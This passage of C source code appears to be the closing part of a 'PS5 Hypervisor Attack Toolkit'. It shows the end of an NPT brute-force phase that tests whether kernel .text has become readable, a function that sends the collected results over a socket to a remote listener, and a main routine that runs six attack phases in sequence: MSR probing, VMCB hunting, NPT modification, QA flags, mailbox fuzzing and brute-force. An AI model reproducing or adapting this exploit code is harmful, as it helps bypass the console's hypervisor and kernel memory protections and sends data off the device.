    results.xom_ptes_found = found;
    results.phase_reached = 6;

    if (found > 0) {
        notify("[HV] P6: Found XOM-like NPT entries, attempting modification...");

        /* Test if .text is now readable */
        uint64_t test[2] = {0};

        /* Trigger TLB flush via CPUID (causes VMEXIT) */
        uint32_t eax;
        __asm__ volatile("cpuid" : "=a"(eax) : "a"(0) : "ebx", "ecx", "edx");

        if (copyout(test, KTEXT_BASE, 16) == 0 && (test[0] || test[1])) {
            notify("[HV] *** SUCCESS: KERNEL .TEXT IS NOW READABLE ***");
        } else {
            notify("[HV] P6: Entries modified but .text still protected (HV may guard NPT)");
        }
    } else {
        notify("[HV] P6: No XOM NPT entries found in scan range");
    }
}

/* ================================================================
 * Network output - send results to listener
 * ================================================================ */

static int send_results(void) {
    int sock = r0gdb_open_socket(LISTENER_IP, LISTENER_PORT);
    if (sock < 0) return -1;

    r0gdb_sendall(sock, &results, sizeof(results));
    close(sock);
    return 0;
}

/* ================================================================
 * Main entry point
 * ================================================================ */

void hv_break_main(void) {
    __builtin_memset(&results, 0, sizeof(results));
    __builtin_memcpy(results.magic, "HVBREAK", 8);
    results.fw_version = r0gdb_get_fw_version();

    notify("[HV] === PS5 Hypervisor Attack Toolkit ===");

    char fw_msg[64] = "[HV] Firmware: ";
    char hex[20];
    hex64(hex, results.fw_version);
    char *p = fw_msg;
    while (*p) p++;
    char *h = hex;
    while (*h) *p++ = *h++;
    *p = 0;
    notify(fw_msg);

    /* Run all phases in sequence */
    phase1_msr_probe();
    phase2_vmcb_hunt();
    phase3_npt_modify();
    phase4_qa_flags();
    phase5_mailbox_fuzz();
    phase6_npt_bruteforce();

    /* Send results to network listener */
    if (send_results() == 0)
        notify("[HV] Results sent to listener");
    else
        notify("[HV] Failed to send results (is listener running?)");

    notify("[HV] === Attack sequence complete ===");
}
